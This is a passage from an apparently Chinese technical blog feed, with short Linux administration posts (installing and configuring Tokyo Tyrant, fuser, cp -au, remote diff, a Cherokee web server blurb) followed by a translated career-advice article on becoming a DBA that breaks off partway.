class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget [http://www.1978th.net/tokyocabinet/tokyocabinet-1.4.45.tar.gz](http://www.1978th.net/tokyocabinet/tokyocabinet-1.4.45.tar.gz)  </span><br><span class="line">tar zxvf tokyocabinet-1.4.45.tar.gz  </span><br><span class="line">cd tokyocabinet-1.4.45/  </span><br><span class="line">./configure  </span><br><span class="line">#注：在32位Linux操作系统上编译Tokyo cabinet，请使用./configure --enable-off64代替./configure，可以使数据库文件突破2GB的限制。  </span><br><span class="line">#./configure --enable-off64  </span><br><span class="line">make  </span><br><span class="line">make install  </span><br><span class="line">cd ../</span><br></pre></td></tr></table></figure></p><p>　　2、然后编译安装tokyotyrant<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget [http://www.1978th.net/tokyotyrant/tokyotyrant-1.1.40.tar.gz](http://www.1978th.net/tokyotyrant/tokyotyrant-1.1.40.tar.gz)  </span><br><span class="line">tar zxvf tokyotyrant-1.1.40.tar.gz  </span><br><span class="line">cd tokyotyrant-1.1.40/  </span><br><span class="line">./configure  </span><br><span class="line">make  </span><br><span class="line">make install  </span><br><span class="line">cd ../</span><br></pre></td></tr></table></figure></p><hr><p>　　<strong>二、配置</strong><br>　　<strong>1、创建tokyotyrant数据文件存放目录</strong>  </p><p>mkdir -p /ttserver/</p><p>　　<strong>2、启动tokyotyrant的主进程（ttserver）</strong><br>　　<strong>(1)、单机模式</strong>  </p><p>ulimit -SHn 51200<br>ttserver -host 127.0.0.1 -port 11211 -thnum 8 -dmn -pid /ttserver/ttserver.pid -log /ttserver/ttserver.log -le -ulog /ttserver/ -ulim 128m -sid 1 -rts /ttserver/ttserver.rts /ttserver/database.tcb#lmemb=1024#nmemb=2048#bnum=10000000</p><p>　　<strong>(2)、双机互为主辅模式</strong><br>　　服务器192.168.1.91：  </p><p>ulimit -SHn 51200<br>ttserver -host 192.168.1.91 -port 11211 -thnum 8 -dmn -pid /ttserver/ttserver.pid -log /ttserver/ttserver.log -le -ulog /ttserver/ -ulim 128m -sid 91 -mhost 192.168.1.92 -mport 11211 -rts /ttserver/ttserver.rts /ttserver/database.tcb#lmemb=1024#nmem b=2048#bnum=10000000</p><p>　　服务器192.168.1.92：  </p><p>ulimit -SHn 51200<br>ttserver -host 192.168.1.92 -port 11211 -thnum 8 -dmn -pid /ttserver/ttserver.pid -log /ttserver/ttserver.log -le -ulog /ttserver/ -ulim 128m -sid 92 -mhost 192.168.1.91 -mport 11211 -rts /ttserver/ttserver.rts /ttserver/database.tcb#lmemb=1024#nmemb=2048#bnum=10000000</p><p>　　<strong>(3)、参数说明</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">　　ttserver [-host name] [-port num] [-thnum num] [-tout num] [-dmn] [-pid path] [-log path] [-ld|-le] [-ulog path] [-ulim num] [-uas] [-sid num] [-mhost name] [-mport num] [-rts path] [dbname]  </span><br><span class="line">  </span><br><span class="line">　　-host name : 指定需要绑定的服务器域名或IP地址。默认绑定这台服务器上的所有IP地址。  </span><br><span class="line">　　-port num : 指定需要绑定的端口号。默认端口号为1978  </span><br><span class="line">　　-thnum num : 指定线程数。默认为8个线程。  </span><br><span class="line">　　-tout num : 指定每个会话的超时时间（单位为秒）。默认永不超时。  </span><br><span class="line">　　-dmn : 以守护进程方式运行。  </span><br><span class="line">　　-pid path : 输出进程ID到指定文件（这里指定文件名）。  </span><br><span class="line">　　-log path : 输出日志信息到指定文件（这里指定文件名）。  </span><br><span class="line">　　-ld : 在日志文件中还记录DEBUG调试信息。  </span><br><span class="line">　　-le : 在日志文件中仅记录错误信息。  </span><br><span class="line">　　-ulog path : 指定同步日志文件存放路径（这里指定目录名）。  </span><br><span class="line">　　-ulim num : 指定每个同步日志文件的大小（例如128m）。  </span><br><span class="line">　　-uas : 使用异步IO记录更新日志（使用此项会减少磁盘IO消耗，但是数据会先放在内存中，不会立即写入磁盘，如果重启服务器或ttserver进程被kill掉，将导致部分数据丢失。一般情况下不建议使用）。  </span><br><span class="line">　　-sid num : 指定服务器ID号（当使用主辅模式时，每台ttserver需要不同的ID号）  </span><br><span class="line">　　-mhost name : 指定主辅同步模式下，主服务器的域名或IP地址。  </span><br><span class="line">　　-mport num : 指定主辅同步模式下，主服务器的端口号。  </span><br><span class="line">　　-rts path : 指定用来存放同步时间戳的文件名。  </span><br><span class="line">  </span><br><span class="line">　　如果使用的是哈希数据库，可以指定参数“#bnum=xxx”来提高性能。它可以指定bucket存储桶的数量。例如指定“#bnum=1000000”，就可以将最新最热的100万条记录缓存在内存中：  </span><br><span class="line"></span><br><span class="line">ttserver -host 127.0.0.1 -port 11211 -thnum 8 -dmn -pid /ttserver/ttserver.pid -log /ttserver/ttserver.log -le -ulog /ttserver/ -ulim 128m -sid 1 -rts /ttserver/ttserver.rts /ttserver/database.tch#bnum=1000000</span><br></pre></td></tr></table></figure></p><p>　　如果大量的客户端访问ttserver，请确保文件描述符够用。许多服务器的默认文件描述符为1024，可以在启动ttserver前使用ulimit命令提高这项值。例如：  </p><p>ulimit -SHn 51200</p><p>　　<strong>3、停止tokyotyrant（ttserver）</strong>  </p><p>ps -ef | grep ttserver</p><p>　　找到ttserver的进程号并kill，例如：  </p><p>kill -TERM 2159</p><hr><p>　　<strong>三、调用</strong><br>　　<strong>1、任何Memcached客户端均可直接调用tokyotyrant。</strong>  </p><p>　　<strong>2、还可以通过HTTP方式调用，下面以Linux的curl命令为例，介绍如何操作tokyotyrant：</strong><br>　　(1)、写数据，将数据“value”写入到“key”中：  </p><p>curl -X PUT <a href="http://127.0.0.1:11211/key" target="_blank" rel="noopener">http://127.0.0.1:11211/key</a> -d “value”</p><p>　　(2)、读数据，读取“key”中数据：  </p><p>curl <a href="http://127.0.0.1:11211/key" target="_blank" rel="noopener">http://127.0.0.1:11211/key</a></p><p>　　(3)、删数据，删除“key”：  </p><p>curl -X DELETE <a href="http://127.0.0.1:11211/key" target="_blank" rel="noopener">http://127.0.0.1:11211/key</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux删除以特殊符号开始的文件名</title>
      <link href="/2010/06/13/linux-removes-filenames-that-start-with-special-symbols/"/>
      <url>/2010/06/13/linux-removes-filenames-that-start-with-special-symbols/</url>
      <content type="html"><![CDATA[<p>linu在用一些工具时经常产生一些临时或备份文件，例如以 -或#开头的文件（像macs就可能产生#开头文件），如何删除这样的文件呢？</p><p><strong>命令：rm ./文件名</strong></p><p>例如：删除文件 #abc# 只需执行 rm ./#abc#</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Cherokee</title>
      <link href="/2010/06/11/cherokee/"/>
      <url>/2010/06/11/cherokee/</url>
      <content type="html"><![CDATA[<p>The Fastest free Web Server out there!  </p><p>Cherokee is a very fast, flexible and easy to configure Web Server. It supports the widespread technologies nowadays: FastCGI, SCGI, PHP, CGI, uWSGI, SSI, TLS and SSL encrypted connections, Virtual hosts, Authentication, on the fly encoding, Load Balancing, Apache compatible log files, Data Base Balancing, Reverse HTTP Proxy, Traffic Shaper, Video Streaming and much more.</p><p>Cherokee-Admin, a user friendly interface, provides a no-hassle configuration of the server. Check out the benchmarks and documentation to learn more, join our active Community and give it a try to squeeze your hardware to the fullest!</p><p><a href="http://www.cherokee-project.com/" target="_blank" rel="noopener">http://www.cherokee-project.com/</a></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用diff或者vimdiff比较远程文件与本地文件</title>
      <link href="/2010/06/11/compare-remote-files-with-local-files-using-diff-or-vimdiff/"/>
      <url>/2010/06/11/compare-remote-files-with-local-files-using-diff-or-vimdiff/</url>
      <content type="html"><![CDATA[<p>方法1：管道给diff</p><p>$ssh <a href="mailto:eric@192.168.1.11" target="_blank" rel="noopener">eric@192.168.1.11</a> “cat ~/remote_file.txt” | diff - ~/local_file.txt  </p><p>方法2：使用vim内建的scp支持</p><p>$vimdiff scp:<a href="mailto://eric@192.168.1.11" target="_blank" rel="noopener">//eric@192.168.1.11</a>/~/remote_file.txt ~/local_file.txt  </p><p>另外，vim内建的scp支持还可以编辑远程文件：</p><p>$vim scp:<a href="mailto://eric@192.168.1.11" target="_blank" rel="noopener">//eric@192.168.1.11</a>/~/remote_file.txt</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux下实现&amp;quot;断点继传&amp;quot;复制文件</title>
      <link href="/2010/06/11/linux-implementation-amp-quot-breakpoint-relay-amp-quot-copy-the-file/"/>
      <url>/2010/06/11/linux-implementation-amp-quot-breakpoint-relay-amp-quot-copy-the-file/</url>
      <content type="html"><![CDATA[<p>朋友们有时侯会碰到在复制一个游戏盘时复制了一部分文件时出现错误，又得重新来过，非常费时。这里介绍一个有效的方法可以节省复制时间，即类似”断点续传的功能”，只复制剩余的部分。<br>方法: cp -au <source-dir> <dist-dir><br>其中 -a 等价于 -dpR 即递归复制。<br>-u /–update 表示只复制源文件比目的文件更新的部分，或复制目的文件不存在时也进行复制。  </dist-dir></source-dir></p><p><source-dir> 源文件，<dist-dir>目的文件<br>例如：复制 /file1 目录树到 /file2目录去<br>cp -a /file1 /file2<br>如果复制了一半发生错误，则再次输入<br>cp -au /file1 /file2<br>即可’断点续传’.</dist-dir></source-dir></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>fuser的使用</title>
      <link href="/2010/06/11/the-use-of-the-fuser/"/>
      <url>/2010/06/11/the-use-of-the-fuser/</url>
      <content type="html"><![CDATA[<p>fuser：使用文件或者套节字来表示识别进程。我常用的他的两个功能：查看我需要的进程和我要杀死我查到的进程。<br>比如当你想umount光驱的时候，结果系统提示你设备正在使用或者正忙，可是你又找不到到底谁使用了他。这个时候fuser可派上用场了。<br>[root@lancy sbin]# eject<br>umount: /media/cdrom: device is busy<br>umount: /media/cdrom: device is busy<br>eject: unmount of `/media/cdrom’ failed<br>[root@lancy sbin]# fuser /mnt/cdrom<br>/mnt/cdrom: 4561c 5382c<br>[root@lancy sbin]# ps -ef |egrep ‘(4561|5382)’ |grep -v grep<br>root 4561 4227 0 20:13 pts/1 00:00:00 bash<br>root 5382 4561 0 21:42 pts/1 00:00:00 vim Autorun.inf<br>示例中，我想弹出光驱，系统告诉我设备忙着，于是采用fuser命令，参数是你文件或scoket，fuser将查出那些使用了他。<br>4561c,5382c表示目前用两个进程在占用着/mnt/cdrom，分别是4561,5382,进程ID后的字母表示占用资源的方式，有下面几种表示：<br>c 当前路径(current directory.)我的理解是表示这个资源的占用是以文件目录方式，也就是进进入了需要释放的资源的路径，这是最常用的资源占用方式。<br>e 正在运行可执行文件（executable being run.），比如运行了光盘上的某个程序<br>f 打开文件（ open file），缺省模式下f忽略。所以上面的例子中，虽然是开打了光盘上的Autorun.inf文件，但是给出的标识是c，而不是f。<br>r root目录（root directory）.没有明白什么意思，难道是说进入了/root这个特定目录？<br>m mmap文件或者共享库( mmap’ed file or shared library).这应该是说某个进程使用了你要释放的资源的某个共享文件。<br>在查找的同时，你还可定指定一些参数，比如<br>-k 杀死这些正在访问这些文件的进程。除非使用-signal修改信号，否则将发送SIGKILL信号。<br>-i 交互模式<br>-l 列出所有已知的信号名称。<br>-n 空间，选择不同的名字空间，可是file,udp,tcp。默认是file，也就是文件。<br>-signal 指定发送的信号，而不是缺省的SIGKILL<br>-4 仅查询IPV4套接字<br>-6 仅查询IPV6套接字<br>- 重置所有的选项，将信息设回SIGKILL<br>再看下面的例子<br>[root@lancy sbin]# fuser -l<br>HUP INT QUIT ILL TRAP ABRT IOT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM<br>STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH IO PWR SYS<br>UNUSED<br>现在我们试试fuser -k的威力：<br>[root@lancy sbin]# fuser -k /mnt/cdrom<br>/mnt/cdrom: 4561c 5382c<br>kill 5382: 没有那个进程<br>No automatic removal. Please use umount /media/cdrom<br>[root@lancy sbin]# eject<br>套节字方式的使用：<br>[root@lancy sbin]# fuser -4 -n tcp 3306<br>here: 3306<br>3306/tcp: 5595<br>[root@lancy sbin]# ps -ef |grep 5595 |grep -v grep<br>mysql 5595 5563 0 22:24 pts/0 00:00:00 /usr/libexec/mysqld –defaults-file=/etc/my.cnf –basedir=/usr –datadir=/var/lib/mysql –user=mysql –pid-file=/var/run/mysqld/mysqld.pid –skip-locking –socket=/var/lib/mysql/mysql.sock<br>[root@lancy sbin]# fuser -4 -n tcp 80<br>here: 80<br>80/tcp: 5685 5688 5689 5690 5691 5692 5693 5694 5695</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>推荐阅读:成就DBA职业生涯</title>
      <link href="/2010/06/11/recommended-reading-career-as-a-dba/"/>
      <url>/2010/06/11/recommended-reading-career-as-a-dba/</url>
      <content type="html"><![CDATA[<p>一篇网络上很流行的文章,对于如何走向dba之路有很大帮助!</p><p>介绍</p><p>许多年来，我在不同的新闻组上花费了很多时间与那些想知道如何得到数据库管理员（DBA）的工作或者如何成长为一名DBA的IT人进行交谈，现在他们有了工作。这些年来许多人针对如何达到这个目标提出了不同意见。本文即是那些意见的综合并且能够在如何才能出色的完成DBA的工作方面给出好的建议。这篇文章同样对于如何让一名DBA变得对老板更有价值。假如你已经是一名DBA，那么也许你会希望跳过文章的前几段。</p><p>我应该成为一名DBA么？</p><p>我曾问过的一个问题是一个人应该从事DBA这样的职业么。这个问题并不容易回答，因为它因人而异。有的人有成为一名好DBA所需要的天赋。而其他人并不认为能够很容易掌握成为DBA的秘诀。DBA职业需要掌握一定的技能。而且还需要其他IT职业所不必需的要求。因此，为了回答这个问题，我通常给将要成为DBA的人描述DBA职业所必需的要求。下面的段落中，我都将以问题结尾。在继续下一段以前请花一些时间考虑并且回答这些问题。</p><p><a href="http://www.ixdba.net/" target="_blank" rel="noopener">www.ixdba.net</a></p><p>许多人因为许多原因而立志要成为DBA。其中一个主要原因是薪水。DBA是IT业中薪水最高的职业之一。其他人想成为DBA是因为喜欢赞扬DBA是受到的荣誉，或者因为他看上去很酷！我个人认为，成为DBA是很值得的。它是一个很有意思，令人兴奋的职业。那么，你把DBA作为一个可能的职业选择的原因是什么呢？</p><p>除非你已经提前准备好了，否则你可能会发现从事DBA职业充满了挫折和令人头痛。一个数据库存在于操作系统和最终用户应用程序之间。同样地，DBA必须非常精通他的数据库所在的操作系统。DBA并不一定需要知道所有有关操作系统的知识，但是他知道得越多越好。数据库与操作系统联系非常紧密。理解这种关联是十分必要的。DBA还需要知道服务器硬件以及它如何影响与帮助数据库。同时，DBA必须理解应用软件。DBA可能会被要求帮助开发人员创建可靠，健全的数据库应用程序。还有，最重要的也是最明显的，DBA必须十分彻底的理解数据库引擎，它是如何工作的，所有的引擎是如何组合在一起的，以及如何影响数据库引擎向最终用户和应用程序传送数据的能力。我见过的最好的DBA有非常深刻的理解而且不仅仅在数据库本身。他们知道一些系统管理与应用开发。好多时候他们在成为DBA之前有其中一个或两个背景。无论如何，成为一名合格的而不是出色的DBA也需要许多背景知识。你是否已经做好准备开始学习直到你感到已经无法再学下去了？</p><p>许多和我交谈过的，在开始DBA职业时遇到困难的人，在尝试着吸收大量DBA所需了解的信息时实际上都会有一些问题。毕竟系统管理员是全职学习操作系统的细节。应用程序开发人员全职学习如何编写好的程序。DBA不仅要非常了解这两种不同的工作，而且还需要花费更多的时间去理解数据库的体系结构，以及理解每一样东西的每一块是如何组合在一起的！听起来是不是很让人畏缩？有许多人失败后这样想，并且把DBA工作看作一项非常困难的事情。也有那些传播和理解所有这些信息，并且使用这些信息做出好的，听起来具有技术性的决定的人。正如我以前是一名DBA时喜欢说的，所有这些对我来说看上去像一个大谜团。把这些所有的很好的组合在一起就是挑战。你是哪一种人？</p><p>许多DBA是随时侯命的。他们会在白天或晚上的所有时间接到呼叫去解决他们的数据库出现的致命问题。数据库是商业信息技术基础组织的必不可少的组成部分。没有数据，就没有必要拥有一个计算机系统。数据推动商业。假如amazon.com的网站不能在数据库中搜索产品并且假如没有人能够为他们的产品下订单，那么它会变成什么样？它就不会在商业中存在很久。当数据库down掉，即使只是很短的时间，公司也会损失重大。基于这个原因，DBA到达现场后必须尽可能迅速的解决问题。许多公司有自己的DBA团队以便可以轮流待命。这些DBA 24x7小时的维持数据库应用程序。假如工作需要的话，你准备好随时候命了么？</p><p>一些DBA的职责包括为软件打补丁或者对数据库做些改变。通常，这些操作不能在公司职员工作的时候做，因为此时数据库必须运行以便他们能够工作。这意味着DBA经常不得不在很早或者深夜甚至周末，总之，在正常工作时间以外来完成工作。你准备好在非正常时间工作，或者你在找一个朝九晚五的工作？</p><p>对DBA而言，需要掌握的一个重要内容就是通常被称为“软技术”的东西。DBA需要在团队中很好的工作，通常团队是在变化的，如系统管理员，网络管理员，应用程序开发人员，项目经理和其他人。DBA要能够用流利的英语解释复杂的技术概念，让团队中其他人明白。DBA还要能够在数据库相关问题上指挥团队队员。你的软技术怎么样？</p><p>下面不是全部列表，但是包括了DBA的典型职责：</p><p>·         把监视数据库实例当作每日必做工作以保证其可用性。解决不可用的问题。</p><p>·         收集系统统计和性能信息以便定向和配置分析。</p><p>·         配置和调整数据库实例以便在应用程序特定要求下达到最佳性能。</p><p>·         分析和管理数据库安全性。控制和监视用户对数据库的访问。必要时审计数据库的使用。</p><p>·         监视备份程序。必要时提供恢复。测试备份与恢复程序。</p><p>·         升级RDBMS软件并且在必要时使用补丁。必要时升级或者迁移数据库实例。</p><p>·         通过数据库相关动作来支持应用程序开发人员。</p><p>·         跟随数据库趋向和技术。当可应用时使用新技术。安装，测试和评估Oracle新的相关产品。</p><p>·         执行存储和物理设计。均衡设计问题以完成性能优化。</p><p>·         创建，配置和设计信的数据库实例。</p><p>·         诊断，故障检测和解决任何数据库相关问题。必要时联系Oracle支持人员以便使问题得到较好的解决。</p><p>·         确保Oracle网络软件（SQL*Net, Net8, Names, OiD）配置和运行的很好。</p><p>·         与系统管理员（Unix &amp; NT）一起工作以保证Oracle相关事务得到很好的处理。</p><p>·         为有效的，定期的维护数据库创建任何必要的脚本。</p><p>前面各段的问题是为了使你考虑一名DBA该做些什么，帮助你决定这是不是适合你的职业。我并非意味着假如你的目标是成为DBA这些会阻止你。我只是尝试着展现一些事实。我看到过一些DBA一旦被实际工作打击了就一蹶不振。他们花费时间，精力和一些金钱获得了他们的第一份DBA工作。我个人认为这个职业非常有价值。而且我无法想像现在做任何其他的会怎样。所以，这一段帮助你决定这是不是你希望从事的。假如它是，那么尽你所有去得到它！</p><p>我怎样得到第一份DBA工作？</p><p>你已经阅读了前面的段落并且认为成为一名DBA是一个好的职业。祝贺你！我希望你的职业能变成你想像得那么令人兴奋和有意义。那么，你如何找到第一份DBA工作？这个问题我已经听别人问了许多许多遍。</p><p>在90年代早期，因特网急速发展。它使公司象草一般萌芽。公司蜂拥而至并且开始创建他们在网上的形象。几乎所有这些有网站的公司都需要一个数据库作为web应用的后台。不幸的是，当时在该领域却没有那么多DBA。在IT业，DBA变得奇缺。那段时间里，得到一份DBA工作看上去只要可以拼出“Oracle”或者可能只是在大学里接触过一学期的数据库就行。为了使生活变得更好，DBA的匮乏促使公司付给有潜力的职员很高的薪水。假如你想要成为一名DBA，很容易，非常容易。你需要做的就是证明你了解什么是数据库然后工作就会比你预期的更早的出现在你面前。</p><p>然后因特网的泡沫破灭了。大量投产因特网的公司破产。许多给公司工作的DBA重新寻找工作。缺少DBA的公司找到一名有DBA经验的人比以前容易得多。在21世纪初期，由于经济并不十分稳固，因此生活并不容易（至少在美国如此）。公司都勒紧了他们的裤腰带。所有这些转化为更少的工作机会和DBA候选人更少的工作空缺。</p><p>得到第一份DBA工作的最艰难的部分是每一个职位都要求有一些工作经验。如果你从公司的角度出发，你就可以理解为什么对DBA职位而言经验是必需的。假如他没有一点经验，你会付给这个人很高的工资让他去操作，维护和运行你IT基础组织的最大最重要的一部分么？你的公司会付钱给一名没有经验的DBA么？并且，在等待他成长起来的过程中可能会损失上百万美元的收入。对大多数公司而言，这些问题的答案肯定是‘不’。所以，没有经验，获得你的第一份DBA工作是很困难的。</p><p>第一份DBA工作现在成了恶性循环的境遇。假如我没有任何经验，我怎样才能得到DBA的工作呢？我没有工作的话又怎么能得到DBA经验呢？这是要战胜的最困难的障碍。最困难的部分是获得第一个DBA工作。这部分的剩下部分将针对实现你第一个DBA工作的目标给你一些建议。</p><p>提示#1:接受教育。–尽可能多的学习有关数据库的知识。这很可能将占用你正常工作以外的部分时间也精力。参加本地大学举办的数据库培训班。许多培训公司都会举办数据库管理员的培训班。假如你的老板不资助你的学习，那么你可能不得不自己支付这笔费用。许多DBA职业要求至少为计算机科学或相关专业本科以上学历，因此你必须至少有那样的文凭。</p><p>提示#2:锻炼成为DBA。–许多数据库供应商都允许你下载他们数据库系统的测试版或评估版。下载一份并且在自己的个人电脑上安装软件。练习使用数据库。故意破坏数据库并且尝试修复它。尝试着履行你所能想到的尽可能多的DBA职责。测试和磨练你在自己的测试平台上的技能这样你就可以证明你的数据库管理能力。</p><p>提示#3:获得认证。–许多数据库提供商都提供自己的数据库产品的认证。许多公司现在都把认证看作是一种标准。需要记住的一件事是仅获得认证是不够的。通过DBA认证测试并不意味着你知道如何管理一个数据库。它只是告诉你以后可能的老板，现在你拥有了一定的技术。它还告诉你的老板你对DBA工作的态度是很认真的。我看到许多人抱怨他们已经得到了认证但是没有经验，却仍然不能得到第一份DBA工作。认证本身并不能使你得到工作，但它是无害的。即使没有其他的，在你进行认证的时候你也已经学到了许多知识。只是不要依赖认证来给你带来你要找的工作。你需要的比这还要多。但它会在最后帮助你。</p><p>提示#4:利用你现有的技能。–许多DBA具有系统管理员背景。其他的有应用程序开发背景。假如可能，查看你能否利用现有的技能来得到工作。现在的目标就是为你和你的老板创造一个双赢的局面。例如，让我们假设你已经是一名系统管理员而想进入DBA领域。也许你会找到一份工作，这份工作一部分时间里可以用到你的系统管理技能，并且在剩下的时间里可以使你涉及到数据库管理领域。假如你已经是一名某个产品平台上的DBA但你希望转到其他产品平台，那么看看你能否找到一份同时接触两个产品平台的工作。这样，公司和你都得到了想要的。在你定向到了DBA工作后，你可以试着得到一个能让你全职作它的职位，也许还可以在同一个公司中。</p><p>提示#5:利用现在的机会。–有时候，一个人进入DBA领域仅仅需要的是正确的地方和正确的时机。假如你现在的老板有一个机会让你进行任何数据库的项目，抓住这个机会！任何数据库经验就比没有数据库经验要好。让你的管理者知道你十分积极的在寻找任何可能的数据库机会。他们就有可能在下次机会到来的时候想到你。进行这些数据库项目以及看到你要成为一个DBA的渴望以后，他们可能会决定培训你，提拔你。许多许多人都是以这种方式获得他的第一个DBA工作，在进行了一些数据库相关的项目后不知不觉的成为一名较低级的DBA。通常当一名DBA离开公司后，公司将在内部寻找一个候选人，假如他们认为这名候选人是可训练的话。</p><p>提示#6:寻找较低级的DBA职位。–假如你只是为了一个较低级的DBA工作，看到DBA职位的需求描述说他们正在寻找高级DBA或者其他的。所以，让我们严谨一些。你并没有一个高级方面的经验。我已经讨论过了对于这样的职位为什么公司不会考虑你。但是他们会在低级的职位上考虑你。低级的DBA在高级DBA的指导下完成工作。他们摸索窍门。一般来说，高级DBA对数据库承担责任，同时也获得所有的荣誉。但是不要焦急。随着你的事业发展，你将会有越来越多的责任和得到越来越多的信任。因为你没有任何经验，你应该从这里开始启航。</p><p>我也听到过一些公司寻找一名高级DBA，但是到最后，他们实际想要雇一名低级的DBA。你或许希望申请这样的职位虽然你也许没有资格。他们可能还是会决定雇佣你。但是提前说明你仍然在摸索阶段并且已经是较低级的DBA水平。不要试图欺骗他们让他们认为你是高级DBA的水平。这只会降低你得到这项工作的机会。</p><p>这些提示将帮助你得到第一份DBA的工作。祝你在寻找工作时有好运气。当你已经找到了第一份DBA工作后，继续下面的部分来学习如何往下走下去。</p><p>我刚得到我的第一份工作！现在该怎样？</p><p>祝贺你！你现在是DBA俱乐部的正式成员了！对于这份梦寐以求的令人激动的职业，你准备好了么？你的工作才刚开始并且你在学习上已经落在后面。你将会发现要成为一名高效的数据库管理员有大量的知识你必须掌握。你的第一年或前两年将花费比以前更多的时间来学习。假如你发现学习知识的数量使你大脑超负荷，那么休息一下，歇口气，然后再回到学习中去。为了帮助你继续走下去，你可以按照下面的方法进行：</p><p>步骤#1: 关系型数据库理论 –这部分我假设你将管理的数据库是一个“关系型”数据库。其他数据库模型也存在，但是关系型模式是近二十年工业上占统治地位的一种数据库模式。假如你的数据库系统是其他的模式，那么学习它的理论。相关数据库理论是十分重要的。它是其他一切的基础。我也看到许多跳到数据库管理职位的人从不想去学习纯粹的关系型数据库理论。不可避免的，在他们的事业中对理论基础的匮乏作为缺点暴露了出来。假如你对关系型数据库理论理解得很好，那么你将非常容易的在任何平台的关系型数据库管理系统（RDBMS）中转变。我使用Oracle数据库，或者IBM的DB2，或者微软的SQL Server是无关紧要的。他们都是关系型数据库系统。他们在最底层都在做着相同的事情。区别在于他们怎样去做相同的事情。纯粹的关系型数据库理论对于较低级的DBA来说并非必需的。但是假如你想要超越低级DBA的水平它就是十分重要的。许多大学的教科书都很好的包含了关系型数据库的理论。其中一本被广泛使用的教科书就是由Elmasri and Navathe编写的数据库系统基础，Bejamin/Cummings Press。</p><p>步骤#2: 彻底的学习查询语言 –数据库都有语言让你能够从数据库中得到数据，把数据放到数据库中，以及修改数据库中的数据。对于关系型数据库而言，这种语言就是结构化查询语言（SQL）。这门语言是你与数据库接触的工具。不能让这个工具成为以后学习的障碍，这一点很重要。在你的测试数据库中练习不同的SQL语句直到他们变成了你的习惯。这方面的一本非常好的书叫做Oracle 9i完全参考（Oracle 9i The Complete Reference）由Loney 和Koch编写，Oracle Press。每一名Oracle DBA都应该在他事业的早期阅读这本书。Oracle 9i参考手册（Oracle 9i SQL Reference manual）是另一个很重要的知识来源。在他们的技术网站TechNet上（<a href="http://technet.oracle.com/" target="_blank" rel="noopener">http://technet.oracle.com</a>）你可以访问所有的Oracle在线文档。你必须注册一个账号，但是它是免费的。每个都应该在TechNet上有一个账号。</p><p>步骤#3: 开始学习基本的数据库管理工作 –这难道不是你最开始在这里的原因？为什么它在列表的第三位？我们尝试着建造一个知识的金字塔，我强烈的感觉到一个人需要知道关系型数据库理论和SQL，并且在你学习如何进行基本的数据库管理工作时把他们当作工具来使用。这些工作包括启动和关闭数据库，备份和恢复数据库，以及创建/删除/修改数据库对象。对于Oracle数据库管理而言，在市面上有大量的书籍可以给你所期望的一个很好的体会。这本书是Oracle 9i DBA手册（Oracle 9i DBA Handbook by Loney on Oracle Press）。我知道的大多数DBA都在他们事业的早期不只一遍的阅读过这本书。这里，你应该同时阅读和理解Oracle 9i 概念指导，Oracle 9i管理员指导，以及Oracle 9i备份与恢复指导（Oracle 9i Concepts Guide, the Oracle 9i Administrator’s Guide, and the Oracle 9i Backup and Recovery Guide）都来自Oracle文档。</p><p>步骤#4: 阅读，阅读，再阅读 –由于你才刚开始你的DBA职业生涯，因此你正在开始为你的技能奠定基础。这需要一段很长的时间去形成，吸收和领会所有你将学到的知识。毫无疑问的，比你资深的DBA由许多工作要做，因此他们可能不会总是腾出大量时间辅导你的学习。你不得不靠自己学习很多东西。这就是阅读的目的。市面上有许多书籍可以解答许多数据库相关的话题。Oracle Press是Oracle公司的官方出版社，有大量的Oracle相关书籍。同时也有其他的出版社，如Wrox Press 和 O’Reilly Press。你也可以找到Oracle文档来阅读。并且还有许多网站和新闻组。尽可能多的读书使你能够继续下去。还有，不只一遍的阅读它们可以使你吸收你第一次阅读时错过的内容。</p><p>步骤#5: 创建测试案例 –我经常看到初学者问一些很基础的问题，其实假如他们花一些时间来考虑，这些问题都是很容易解答的。毫无疑问的，在你开始学习Oracle的时候你会有许多的问题。看看这些问题你能不能自己回答出来。例如，我又一次被问到能不能向有唯一性约束的列中插入空值。最开始，这看上去也许不是很容易回答的问题。但它却是非常容易去试验的！只需要创建一个简单的表。在其中的一列，假如唯一性约束。尝试着在该列插入一个空值。有效么？你应该能够非常容易的回答出这个问题了。那么，为什么要创建这些案例呢？一个原因是这样做可以提高你解决问题的能力。创建这些案例需要的技能就是解决问题用到的技能。解决问题的技能将会对你的DBA事业有很大的帮助。另一个原因是随着你的事业的发展，你将经常需要创建更复杂的测试案例以便保证数据库和应用程序的成功。在将来，甚至简单的测试案例也可以组成更复杂的数据库和应用程序分解。</p><p>步骤#6: 找一个良师 –一个良师能够为你的DBA生涯（或者其它类似的职业）引领方向。他们能够给你指示，回答问题以及在你的DBA的成长过程中帮助你节约一些时间。但愿这篇文章能够在你事业发展的一段时间内起到良师益友的作用。假如你与一名资深的DBA共同工作，那么那个人应该有责任为你的事业进行有益的指导。你也可以同时选择其他的人指导你。</p><p>步骤#7: 参加本地用户群 